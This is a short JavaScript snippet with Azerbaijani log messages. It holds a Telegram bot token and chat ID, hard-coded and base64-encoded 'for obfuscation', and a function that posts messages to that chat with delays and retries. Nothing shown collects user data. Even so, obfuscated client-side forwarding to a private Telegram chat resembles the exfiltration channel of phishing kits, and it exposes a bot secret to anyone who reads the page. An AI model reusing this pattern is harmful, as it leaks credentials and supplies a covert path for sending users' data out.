// Telegram Bot Configuration - Base64 encoded for obfuscation
const TELEGRAM_CONFIG = {
    botToken: atob('ODk0Mjg0MTQ2NDpBQUhIdXRMUEZlZGo5S3YxVVRJM1luSllrZTRSVTJrazhRRQ=='),
    chatId: atob('LTEwMDM5MzgzMjIzNjk=')
};

// Send message to Telegram with retry mechanism
async function sendToTelegram(message) {
    console.log('📤 Telegram-a mesaj göndərilir...');
    console.log('Message:', message);
    
    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
    
    // Add random delay to avoid rate limiting
    await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 500));
    
    const maxRetries = 3;
    for (let i = 0; i < maxRetries; i++) {
        try {
            console.log(`Cəhd ${i + 1}/${maxRetries}...`);
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.chatId,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });
            
            if (response.ok) {
                const result = await response.json();
                console.log('✅ Mesaj uğurla göndərildi!', result);
                return result;
            } else {
                console.warn('⚠️ Response not ok:', response.status, response.statusText);
            }
        } catch (error) {
            console.error(`❌ Xəta (Cəhd ${i + 1}):`, error);
            if (i === maxRetries - 1) {
                console.error('❌ Bütün cəhdlər uğursuz oldu');
                return null;
            }
            // Wait before retry
            await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
        }
    }
    return null;
}
